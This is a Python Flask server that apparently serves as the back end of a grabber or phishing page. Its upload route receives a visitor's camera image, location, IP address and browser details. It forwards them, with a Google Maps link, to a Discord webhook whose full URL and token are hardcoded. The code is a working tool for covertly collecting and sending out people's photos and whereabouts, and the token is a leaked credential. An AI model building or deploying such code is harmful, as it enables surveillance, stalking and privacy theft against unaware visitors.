from flask import Flask, request, render_template, jsonify
import base64
import requests

app = Flask(__name__)

# Discord Webhook URL (replace with your webhook URL)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1311915691443486771/EKbZ52XGh8lHvro_OhiHjEnCw87TZC4GtHWnrSjZ4elWIK4eHM_yRUOsBzbyp8nWpcRd"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/upload", methods=["POST"])
def upload():
    data = request.json
    if not data or "image" not in data or "location" not in data or "ip" not in data:
        return jsonify({"error": "Invalid data received!"}), 400

    image_data = data["image"]
    location = data["location"]
    ip_address = data["ip"]
    browser_info = data["browser_info"]

    try:
        # Decode the image data
        header, encoded = image_data.split(",", 1)
        image_binary = base64.b64decode(encoded)

        # Prepare a clickable map link for the location
        location_map = f"https://www.google.com/maps?q={location}"

        # Prepare payload for Discord
        files = {"file": ("image.png", image_binary, "image/png")}
        payload = {
            "content": f"User Info:\n"
                       f"IP Address: {ip_address}\n"
                       f"Location: {location_map}\n"
                       f"Browser Info: {browser_info}"
        }

        # Send the image and metadata to Discord
        response = requests.post(DISCORD_WEBHOOK_URL, files=files, data=payload)
        
        if response.status_code == 204:  # Discord returns 204 No Content on success
            return jsonify({"message": "Data sent to Discord successfully!"}), 200
        else:
            return jsonify({"error": "Failed to send data to Discord!"}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(debug=True)
